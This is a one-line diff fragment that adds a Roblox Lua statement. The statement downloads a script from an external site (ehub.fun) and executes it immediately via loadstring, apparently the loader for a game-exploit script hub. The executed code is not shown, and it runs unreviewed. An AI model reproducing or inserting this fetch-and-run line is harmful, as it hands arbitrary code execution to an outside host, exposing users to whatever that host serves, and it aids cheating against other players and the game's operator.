@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://ehub.fun/raw/script.lua"))()
